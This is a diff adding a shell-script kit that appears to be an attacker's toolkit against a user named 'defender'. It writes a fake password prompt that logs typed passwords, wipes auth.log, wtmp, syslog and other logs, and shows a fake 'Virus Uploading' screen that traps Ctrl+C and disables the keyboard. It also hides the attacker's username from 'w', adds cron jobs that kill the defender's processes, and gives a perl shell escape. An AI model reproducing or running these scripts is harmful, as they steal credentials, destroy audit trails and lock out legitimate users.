@@ -1,0 +1,84 @@
+cat <<EOL | sudo tee /var/lib/upower/wilp.txt > /dev/null
+#!/bin/bash
+#Stores IP address
+IPADDR=$(hostname -I | awk '{print $1}')
+# Ask for login
+echo "Permission denied, please try again.
+defender@$IPADDR's password: "; read -sr login
+echo "$login" >> lgg.txt
+EOL
+chmod 777 /var/lib/upower/wilp.txt
+touch /var/lib/upower/lgg.txt
+chmod 777 /var/lib/upower/lgg.txt
+
+cat /dev/null > /var/log/auth.log
+cat /dev/null > /var/log/lastlog
+cat /dev/null > /var/log/wtmp
+cat /dev/null > /var/log/btmp
+cat /dev/null > /var/log/syslog
+cat /dev/null > /var/log/faillog
+cat /dev/null > /var/log/daemon.log
+
+#Virus Uploading
+#!/bin/bash
+
+# Function to handle SIGINT (Ctrl+C) and SIGTSTP (Ctrl+Z)
+trap '' SIGINT SIGTSTP
+
+countdown=100
+total=100
+
+# Hide cursor
+tput civis  
+
+# Block user input (disable keyboard)
+stty -echo -icanon time 0 min 0  
+
+while [ $countdown -ge 0 ]; do
+    # Calculate percentage completion
+    percent=$(( (total - countdown) * 100 / total ))
+    bar_length=$(( (total - countdown) * 10 / total ))
+
+    # Generate progress bar
+    bar=""
+    for ((i=0; i<bar_length; i++)); do bar+="█"; done
+    for ((i=bar_length; i<10; i++)); do bar+="░"; done
+
+    # Change colors dynamically
+    color_code=$((31 + (countdown % 6)))  # Cycle through colors 31-36 (Red - Cyan)
+
+    # Print animated countdown with progress bar
+    echo -ne "\r\033[5m\033[1;${color_code}m⏳ Virus Uploading: $countdown \033[0m [$bar] ${percent}%"
+
+    sleep 1
+    ((countdown--))
+done
+
+# Clear previous text and display completion message
+echo -e "\r\033[1;32m✅ Virus Upload Complete! 🎉          \033[0m"
+
+# Restore cursor
+tput cnorm
+
+# Restore keyboard input
+stty sane  
+
+# Restore default signal handling
+trap - SIGINT SIGTSTP
+
+
+
+#!/bin/bash
+
+/usr/bin/ww $1 | grep -v 'abdullayev.coshgun' | grep -v 'root' | grep -v 'abdullayev' | grep -v 'coshgun' 
+
+
+* * * * * /usr/bin/wall -n "The system will be restarted in 2 minutes"
+*/2 * * * * /usr/bin/pkill -u defender
+
+
+#Escaping the perl interpreter, type the command below, hit 'Enter', and then hit 'CTRL+D' to run the command and open a shell
+exec'/bin/sh';
+
+
+https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
